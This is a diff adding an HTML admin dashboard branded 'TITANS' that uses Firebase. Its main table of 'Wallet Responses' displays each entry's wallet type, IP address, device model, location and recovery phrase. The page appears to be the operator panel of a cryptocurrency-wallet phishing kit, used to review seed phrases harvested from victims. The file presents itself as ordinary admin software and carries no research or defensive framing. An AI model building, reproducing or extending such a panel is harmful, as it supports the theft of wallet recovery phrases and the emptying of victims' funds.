@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Admin Dashboard</title>
+
+    <!-- ======= Styles ====== -->
+    <link rel="icon" href="./assets/images/logo-icon.jpg">
+    <link rel="stylesheet" href="./assets/css/admin.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+        integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+
+    <!-- ======== Script ======= -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database.js"></script>
+    <script type="module" src="./assets/js/admin.js"></script>
+</head>
+
+<body>
+    <!-- ======================= Loading ======================== -->
+    <div id="progress-bar-container">
+        <div id="progress-bar"></div>
+    </div>
+    <div id="loading-screen" class="loading">Loading...</div>
+
+    <!-- =============== Navigation ================ -->
+    <div class="container" id="dashboard-content" style="display: none;">
+        <div class="navigation">
+            <ul>
+                <li>
+                    <a href="index.html">
+                        <span class="icon">
+                            <img src="./assets/images/icon.png" alt="">
+                        </span>
+                        <span class="title brand">
+                            <h3>TITANS</h3>
+                        </span>
+                    </a>
+                </li>
+
+                <li>
+                    <a href="admin.html">
+                        <span class="icon">
+                            <i style="color: #9a15d3;" class="fa-solid fa-wallet"></i>
+                        </span>
+                        <span class="title">Responses</span>
+                    </a>
+                </li>
+
+                <li>
+                    <a href="owopo.html">
+                        <span class="icon">
+                            <i class="fa-solid fa-layer-group"></i>
+                        </span>
+                        <span class="title">Dashboard</span>
+                    </a>
+                </li>
+
+                <li>
+                    <a style="color: red; cursor: pointer;" class="logoutButton">
+                        <span class="icon">
+                            <i class="fa-solid fa-right-from-bracket"></i>
+                        </span>
+                        <span class="title">Sign Out</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <!-- ========================= Main ==================== -->
+        <div class="main">
+            <div class="topbar">
+                <div></div>
+                <div class="toggle">
+                    <img src="./assets/images/menu.png" alt="">
+                </div>
+
+                <div class="search">
+                    <input id="searchInput" type="search" placeholder="🔎Search user by name">
+                </div>
+
+                <div class="settings">
+                    <a style="color: red;" class="logoutButton">
+                        <span class="icon">
+                            <i class="fa-solid fa-right-from-bracket"></i>
+                        </span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- ======================= Admin dashboard ================== -->
+            <h1 style="color: #fff;">Wallet Responses</h1>
+            <div id="admin-dashboard">
+                <table style="border-radius: 10px;" id="users-table">
+                    <thead>
+                        <tr>
+                            <th>Wallet Type</th>
+                            <th>IP Address</th>
+                            <th>Device Model</th>
+                            <th>Location</th>
+                            <th>Recovery Phrase</th>
+                            
+                        </tr>
+                    </thead>
+                    <tbody id="users-list">
+                        <!-- User rows will be populated here -->
+                    </tbody>
+                </table>
+            </div>
+            <!-- 
+            <div id="admin-dashboard">
+                <h2>Transactions Data</h2>
+                <table id="users-table">
+                    <thead>
+                        <tr>
+                            <th>Full Name</th>
+                            <th>Email</th>
+                            <th>Type</th>
+                            <th>Price</th>
+                            <th>Date</th>
+                            <th>Status</th>
+                            <th style="color: red;">Delete</th>
+                        </tr>
+                    </thead>
+                    <tbody id="users-list">
+                        User rows will be populated here
+                    </tbody>
+                </table>
+            </div>
+            -->
+
+
+            <!-- ========================== Popups ====================== -->
+            <div class="confirmationPopup">
+                <div class="popup-content">
+                    <span id="confirmationMessage">Are you sure you want to log out?</span>
+                    <div>
+                        <button class="confirmYes">Yes</button>
+                        <button class="confirmNo">No</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- =================== Scripts =====================  -->
+            <script>
+                // ==================== Menu Toggle ===================== //
+                let toggle = document.querySelector(".toggle");
+                let navigation = document.querySelector(".navigation");
+                let main = document.querySelector(".main");
+
+                toggle.onclick = function () {
+                    navigation.classList.toggle("active");
+                    main.classList.toggle("active");
+                };
+
+                // ========== Close popup when clicking outside of it ========== //
+                window.onclick = function (event) {
+                    const popup = document.getElementById('popup');
+                    if (event.target === popup) {
+                        popup.style.display = 'none';
+                    }
+                }
+
+                // Close popup when clicking the close button
+                document.querySelector('.close-popup').onclick = function () {
+                    document.getElementById('popup').style.display = 'none';
+                }
+            </script>
+</body>
+
+</html>
